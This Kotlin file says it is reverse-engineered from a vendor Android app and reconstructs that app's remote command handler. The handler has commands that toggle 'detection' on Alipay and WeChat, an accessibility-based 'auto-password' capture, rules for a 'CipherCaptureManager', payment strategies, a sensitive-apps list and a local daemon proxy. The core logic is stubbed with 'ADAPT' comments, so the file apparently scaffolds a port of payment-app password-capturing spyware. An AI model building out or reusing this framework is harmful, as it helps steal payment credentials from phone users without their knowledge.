package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

/**
 * Handles detection commands (Alipay, WeChat, auto-password, view cache rules).
 *
 * Reverse-engineered from JADX: C0345a2 (a2, 454 lines).
 * Vendor name: DetectionCommandHandler
 *
 * Supported commands:
 * - ALIPAY_DETECTION_START/STOP, WECHAT_DETECTION_START/STOP
 * - AUTO_PASSWORD_DETECTION_START/STOP
 * - SET_VIEW_CACHE_RULES, ADD_VIEW_CACHE_RULE, REMOVE_VIEW_CACHE_RULE
 * - CLEAR_VIEW_CACHE_RULES, GET_VIEW_CACHE_STATUS
 * - SET_PAYMENT_STRATEGIES, SET_SENSITIVE_APPS, LOCAL_SERVICE_PROXY
 */
class DetectionCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "DetectionCmdHandler"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "ALIPAY_DETECTION_START",
        "ALIPAY_DETECTION_STOP",
        "WECHAT_DETECTION_START",
        "WECHAT_DETECTION_STOP",
        "AUTO_PASSWORD_DETECTION_START",
        "AUTO_PASSWORD_DETECTION_STOP",
        "SET_VIEW_CACHE_RULES",
        "ADD_VIEW_CACHE_RULE",
        "REMOVE_VIEW_CACHE_RULE",
        "CLEAR_VIEW_CACHE_RULES",
        "GET_VIEW_CACHE_STATUS",
        "SET_PAYMENT_STRATEGIES",
        "SET_SENSITIVE_APPS",
        "LOCAL_SERVICE_PROXY"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "ALIPAY_DETECTION_START" -> {
                val delayMs = params?.optLong("delayMs", 0L) ?: 0L
                Log.d(TAG, "启动支付宝检测，延时: ${delayMs}ms")
                // ADAPT: Vendor calls service.startAlipayDetection(delayMs)
            }
            "ALIPAY_DETECTION_STOP" -> {
                Log.d(TAG, "停止支付宝检测")
                // ADAPT: Vendor calls service.stopAlipayDetection()
            }
            "WECHAT_DETECTION_START" -> {
                val delayMs = params?.optLong("delayMs", 0L) ?: 0L
                Log.d(TAG, "启动微信检测，延时: ${delayMs}ms")
                // ADAPT: Vendor calls service.startWechatDetection(delayMs)
            }
            "WECHAT_DETECTION_STOP" -> {
                Log.d(TAG, "停止微信检测")
                // ADAPT: Vendor calls service.stopWechatDetection()
            }
            "AUTO_PASSWORD_DETECTION_START" -> {
                val delayMs = params?.optLong("delayMs", 5000L) ?: 5000L
                Log.d(TAG, "启动自动密码检测，延时: ${delayMs}ms")
                // ADAPT: Vendor calls service accessibilityEventManager.enableAutoPassword(delayMs)
            }
            "AUTO_PASSWORD_DETECTION_STOP" -> {
                Log.d(TAG, "停止自动密码检测")
                // ADAPT: Vendor calls service accessibilityEventManager.disableAutoPassword()
            }
            "SET_VIEW_CACHE_RULES" -> handleSetViewCacheRules(params, context)
            "ADD_VIEW_CACHE_RULE" -> handleAddViewCacheRule(params, context)
            "REMOVE_VIEW_CACHE_RULE" -> handleRemoveViewCacheRule(params, context)
            "CLEAR_VIEW_CACHE_RULES" -> handleClearViewCacheRules(context)
            "GET_VIEW_CACHE_STATUS" -> handleGetViewCacheStatus(context)
            "SET_PAYMENT_STRATEGIES" -> handleSetPaymentStrategies(params, context)
            "SET_SENSITIVE_APPS" -> handleSetSensitiveApps(params, context)
            "LOCAL_SERVICE_PROXY" -> handleLocalServiceProxy(params, context)
        }
    }

    private fun handleSetViewCacheRules(params: JSONObject?, context: CommandContext) {
        val packages = params?.optJSONArray("packages")
        if (packages == null || packages.length() == 0) {
            // Clear all rules
            Log.d(TAG, "清空所有视图缓存规则")
            context.emitLocalEvent("vc_updated", mapOf("packages" to emptyList<String>()))
            return
        }
        Log.d(TAG, "设置视图缓存规则: ${packages.length()} 个包")
        // ADAPT: Vendor parses each package entry and updates CipherCaptureManager
    }

    private fun handleAddViewCacheRule(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) return
        val appName = params?.optString("appName", "") ?: ""
        Log.d(TAG, "添加视图缓存规则: $packageName ($appName)")
        // ADAPT: Vendor calls CipherCaptureManager.addRule
    }

    private fun handleRemoveViewCacheRule(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) return
        Log.d(TAG, "移除视图缓存规则: $packageName")
        // ADAPT: Vendor calls CipherCaptureManager.removeRule
    }

    private fun handleClearViewCacheRules(context: CommandContext) {
        Log.d(TAG, "清空视图缓存规则")
        context.emitLocalEvent("vc_updated", mapOf("packages" to emptyList<String>()))
    }

    private fun handleGetViewCacheStatus(context: CommandContext) {
        Log.d(TAG, "获取视图缓存状态")
        context.emitLocalEvent("vc_status", mapOf(
            "packages" to emptyList<String>(),
            "active" to false,
            "hasRules" to false
        ))
    }

    private fun handleSetPaymentStrategies(params: JSONObject?, context: CommandContext) {
        val strategies = params?.optJSONArray("strategies")
        if (strategies == null) {
            Log.w(TAG, "SET_PAYMENT_STRATEGIES: 无策略数据")
            return
        }
        Log.d(TAG, "📋 收到支付策略更新: ${strategies.length()}条")
        // ADAPT: Vendor parses strategies, saves to SharedPrefs, updates CipherCaptureManager
    }

    private fun handleSetSensitiveApps(params: JSONObject?, context: CommandContext) {
        val apps = params?.optJSONArray("apps")
        if (apps == null) {
            Log.w(TAG, "SET_SENSITIVE_APPS: 无数据")
            return
        }
        Log.d(TAG, "📋 收到敏感应用更新: ${apps.length()} 个，转发到 local-service")
        // ADAPT: Vendor forwards to local-service proxy
    }

    private suspend fun handleLocalServiceProxy(params: JSONObject?, context: CommandContext) {
        val path = params?.optString("path", "") ?: ""
        val method = params?.optString("method", "GET") ?: "GET"

        if (path.isEmpty()) {
            context.emitLocalEvent("proxy_result", mapOf("success" to false, "error" to "missing path"))
            return
        }
        Log.d(TAG, "LOCAL_SERVICE_PROXY: $method $path")
        // ADAPT: Vendor proxies request to local Go daemon
    }
}
